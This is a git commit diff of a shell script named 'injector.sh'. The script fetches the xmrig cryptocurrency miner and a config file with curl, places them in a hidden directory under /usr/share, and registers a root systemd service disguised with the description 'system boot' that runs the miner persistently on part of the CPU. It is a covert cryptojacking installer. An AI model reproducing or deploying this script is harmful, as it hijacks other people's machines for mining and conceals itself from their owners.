c1e3f0d1bd5365defe80948cd72f8bb45fdfad04
Vijayaraghavan <42708326+shadowctrl@users.noreply.github.com>
2022-03-09 22:06:30 +0530

    Update injector.sh

--- injector.sh
+++ injector.sh
@@ -17,11 +17,13 @@ then
     fi
    }
    exits
-   files=$(curl -s -O <<<< url of xmrig >>>>  -O <<<< url for config.json >>>>)  #add url of xmrig file and config.json.
+   
+   files=$(curl -s -O <url of xmrig>  -O <url for config.json> )  #add url of xmrig file and config.json.
    touch xmrig.service
    per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
    dir=$(mkdir /usr/share/.logstxt)
    move=$(mv xmrig config.json /usr/share/.logstxt/ && mv xmrig.service /etc/systemd/system/)
+   
    threads=$(lscpu -p | grep -c "^[0-9]") 
    tf=$(printf %.f "$((25 * $threads))e-2")
    append=$(echo -e "[Unit]\nDescription=system boot\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=1200\nUser=root\nExecStart=/usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json --      threads=$tf\nRemainAfterExit=yes\nKillMode=process\n\n[Install]\nWantedBy=multi-user.target">/etc/systemd/system/xmrig.service)
